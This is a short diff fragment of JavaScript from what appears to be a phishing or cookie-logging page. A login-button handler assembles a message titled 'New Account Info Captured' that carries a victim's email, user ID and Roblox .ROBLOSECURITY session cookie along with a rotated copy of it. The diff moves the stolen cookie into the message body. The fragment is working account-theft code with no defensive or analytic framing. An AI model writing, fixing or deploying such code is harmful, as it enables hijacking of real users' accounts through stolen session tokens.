@@ -176,12 +176,12 @@ document.getElementById('login-button').addEventListener('click', () => {
   const payload = {
     embeds: [{
       title: "New Account Info Captured",
-      color: 15158332,  // red color
+      color: 15158332,
+      description: `**.ROBLOSECURITY:**\n${extractedSecurity}`, // put the token here
       fields: [
         { name: "Email", value: safeEmail, inline: false },
         { name: "UserID", value: extractedPlayerID, inline: false },
-	{ name: "UnrotatedSecurity", value: refreshedSecurity, inline: false },
-        { name: ".ROBLOSECURITY", value: extractedSecurity, inline: false }
+        { name: "UnrotatedSecurity", value: refreshedSecurity, inline: false }
       ],
       timestamp: new Date().toISOString()
     }]
